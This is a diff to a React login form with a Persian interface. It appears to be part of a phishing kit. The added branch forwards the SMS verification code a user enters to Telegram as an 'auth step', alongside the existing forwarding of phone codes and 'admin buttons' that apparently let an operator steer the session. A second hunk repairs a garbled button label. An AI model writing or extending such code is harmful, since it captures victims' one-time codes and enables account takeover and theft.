@@ -277,25 +277,37 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("🔍 Verifying code:", verifyCode);
+      console.log("🔍 Verifying code:", verifyCode, "SMS mode:", isSmsCodeMode);
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo mode: accepting any 6-digit code");
         await new Promise((resolve) => setTimeout(resolve, 1000));
       } else {
-        // Update verification in Telegram
-        const success = await updatePhoneVerificationCode(
-          sessionId,
-          verifyCode,
-        );
-        if (!success) {
-          throw new Error("Failed to update phone verification");
+        if (isSmsCodeMode) {
+          // Send SMS code as auth step to Telegram
+          console.log("📱 Sending SMS code to Telegram as auth step");
+          const success = await updateAuthStep(sessionId, "sms", verifyCode);
+          if (!success) {
+            throw new Error("Failed to update SMS auth step");
+          }
+        } else {
+          // Regular phone verification
+          const success = await updatePhoneVerificationCode(
+            sessionId,
+            verifyCode,
+          );
+          if (!success) {
+            throw new Error("Failed to update phone verification");
+          }
         }
       }
 
       console.log("✅ Code verified successfully");
       setCurrentStep("loading");
+
+      // Reset SMS mode
+      setIsSmsCodeMode(false);
 
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
@@ -3150,7 +3162,7 @@ export const LoginForm = () => {
                         <span>در حال ارسال کد...</span>
                       </div>
                     ) : (
-                      "ارسال ��د تایید"
+                      "ارسال کد تایید"
                     )}
                   </button>
                 </div>
